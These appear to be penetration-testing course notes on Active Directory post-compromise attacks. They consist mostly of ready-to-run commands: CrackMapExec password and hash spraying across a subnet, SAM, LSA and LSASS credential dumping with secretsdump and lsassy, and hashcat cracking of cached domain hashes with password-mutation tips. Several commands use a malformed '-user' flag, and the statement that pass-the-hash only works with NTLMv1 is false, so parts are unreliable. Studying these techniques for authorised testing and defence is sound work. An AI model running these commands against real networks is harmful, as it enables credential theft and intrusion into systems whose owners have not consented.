# Active Directory Post-Compromise Attacks

### Introduction

What happens after we have an account?

Moving vertically and laterally

### Pass Attacks Overview

**Pass the Password/Pass the Hash**

If we crack a password and/or can dump the SAM hashes, we can leverage both for lateral movement in networks

**Pass the Password**

`crackmapexec smb 10.0.0.0/24 -u user -d domain -p password`

Grab hashes with Metasploit's `hashdump` or with Impacket's secretsdump if we have access to an Admin account

`impacket-secretsdump domain/user:password@10.0.0.1`

**Pass the Hash**

`crackmapexec smb 10.0.0.0/24 -user -H hash --local-auth`

We can use CME to dump valuable data

`crackmapexec smb 10.0.0.0/24 -user -H hash --local-auth --sam`

Enumerate shares

`crackmapexec smb 10.0.0.0/24 -user -H hash --local-auth --shares`

Dump the Local Security Authority (LSA)

`crackmapexec smb 10.0.0.0/24 -user -H hash --local-auth --lsa`

CME also has built-in modules, list them with `crackmapexec smb -L`

lsassy allows us to dump the [Local Security Authority Subsystem Service (LSASS)](https://www.microsoft.com/en-us/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/)

Allows us to access credentials that may not be dumped with secretsdump 

`crackmapexec smb 10.0.0.0/24 -user -H hash --local-auth -M lsassy`

There's also a database for CME called the `cmedb`

### Pass Attacks Lab

Example attack

Run a pass the password attack with the credentials recovered from our initial attacks then use the access 
found with CME to start dumping data

`crackmapexec smb 10.0.0.0/24 -u user -d domain -p password`

Pass the hash attacks *only work with NTLMv1*

`crackmapexec smb 10.0.0.0/24 -u administrator -H admin-hash --local-auth`

Run CME to dump the SAM hashes when we pwn some machines, the hashes will be added to the cmedb

`crackmapexec smb 10.0.0.0/24 -u administrator -H admin-hash --local-auth --sam`

Enumerate the shares

`crackmapexec smb 10.0.0.0/24 -u administrator -H admin-hash --local-auth --shares`

Dump the LSA, will also be dumped by secretsdump

`crackmapexec smb 10.0.0.0/24 -u administrator -H admin-hash --local-auth --lsa`

mscache hashes (DCC2) will be dumped and can be cracked so look for Domain Administrator account names

`hashcat -m 2100 -O hash.txt rockyou.txt`

If the password has a date try incrementing it, if it has multiple symbols e.g. !!!, try adding an additional 
symbol

Use CME modules to see what else the credentials can do (GPP password, impersonate, keepass file discovery, 
etc.)

`crackmapexec smb -L`

Run lsassy to dump any secrets stored in memory (NTLM hashes of logged in users)

`crackmapexec smb 10.0.0.0/24 -u administrator -H admin-hash --local-auth -M lsassy`
